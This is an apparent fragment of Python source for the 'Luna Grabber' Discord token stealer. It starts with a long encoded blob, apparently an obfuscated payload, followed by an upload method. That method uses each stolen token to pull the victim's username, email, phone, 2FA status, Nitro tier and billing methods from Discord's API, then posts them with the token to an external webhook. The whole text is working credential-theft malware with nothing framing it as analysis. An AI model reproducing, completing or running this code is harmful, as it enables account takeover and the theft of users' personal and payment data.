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'))
    def upload(self, webhook):
        for token in self.tokens:
            if token in self.tokens_sent:
                continue

            val = ""
            methods = ""
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token
            }
            user = requests.get(self.baseurl, headers=headers).json()
            payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
            username = user['username']
            discord_id = user['id']
            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif" \
                if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.gif").status_code == 200 \
                else f"https://cdn.discordapp.com/avatars/{discord_id}/{user['avatar']}.png"
            phone = user['phone']
            email = user['email']

            mfa = ":white_check_mark:" if user.get('mfa_enabled') else ":x:"

            premium_types = {
                0: ":x:",
                1: "Nitro Classic",
                2: "Nitro",
                3: "Nitro Basic"
            }
            nitro = premium_types.get(user.get('premium_type'), ":x:")

            if "message" in payment or payment == []:
                methods = ":x:"
            else:
                methods = "".join(["💳" if method['type'] == 1 else "<:paypal:973417655627288666>" if method['type'] == 2 else ":question:" for method in payment])

            val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n:closed_lock_with_key: **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n'

            data = {
                "embeds": [
                    {
                        "title": f"{username}",
                        "color": 5639644,
                        "fields": [
                            {
                                "name": "Discord Info",
                                "value": val
                            }
                        ],
                        "thumbnail": {
                            "url": avatar_url
                        },
                        "footer": {
                            "text": "Luna Grabber | Created By Smug"
                        },
                    }
                ],
                "username": "Luna",
                "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
            }

            requests.post(webhook, json=data)
            self.tokens_sent.append(token)